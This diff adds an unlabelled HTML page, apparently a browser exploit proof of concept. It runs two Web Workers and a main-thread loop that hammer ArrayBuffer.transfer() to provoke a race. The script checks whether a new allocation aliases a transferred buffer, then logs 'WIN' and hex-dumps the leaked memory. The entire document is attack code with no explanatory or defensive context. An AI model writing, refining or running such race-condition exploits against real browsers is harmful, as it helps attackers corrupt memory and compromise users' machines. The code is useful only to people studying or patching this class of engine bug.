@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>v17</title>
+<style>body{background:#000;color:#0f0;font:12px monospace;white-space:pre-wrap;margin:0;padding:8px}</style>
+</head>
+<body>
+<div id="log">v17 race loaded
+</div>
+<script>
+const L=m=>{document.getElementById('log').textContent+=m+"\n"};
+const S=0x1000;
+
+// worker: hammer transfer()
+const W=`let n=0;function l(){for(let i=0;i<500;i++){const a=new ArrayBuffer(${S});new Uint8Array(a)[0]=0x41;const t=a.transfer();t.transfer()}n+=500;postMessage(n);setTimeout(l,0)}l()`;
+
+const w1=new Worker(URL.createObjectURL(new Blob([W],{type:'text/javascript'})));
+const w2=new Worker(URL.createObjectURL(new Blob([W],{type:'text/javascript'})));
+w1.onmessage=e=>L('w1 it='+e.data);
+w2.onmessage=e=>L('w2 it='+e.data);
+
+// main thread: also transfer, watch for double-own
+let it=0,win=0;
+const A=[];for(let i=0;i<64;i++)A.push(new ArrayBuffer(S));
+function M(){return new ArrayBuffer(S)}
+function step(){
+  for(let k=0;k<2000;k++){
+    it++;const i=it%64;const a=A[i];if(a.detached){A[i]=M();continue}
+    const t=a.transfer();const u=new Uint8Array(t);
+    if(u[0]===0x41){u[0]=0x43;if(new Uint8Array(t)[0]===0x43){const c=new Uint8Array(S);c[0]=0x44;if(u[0]===0x44){win++;L('WIN #'+win+' it='+it);const d=new DataView(t);let s='';for(let j=0;j<64;j+=4){s+=j.toString(16).padStart(2,'0')+':'+d.getUint32(j,true).toString(16).padStart(8,'0')+' '}L('dump: '+s);w1.terminate();w2.terminate();return}}}
+    A[i]=M();
+  }
+  if(it%100000===0){const h=performance.memory?(performance.memory.usedJSHeapSize/1048576|0)+'MB':'?';L('it='+it+' heap='+h)}
+  setTimeout(step,0);
+}
+step();
+</script>
+</body>
+</html>
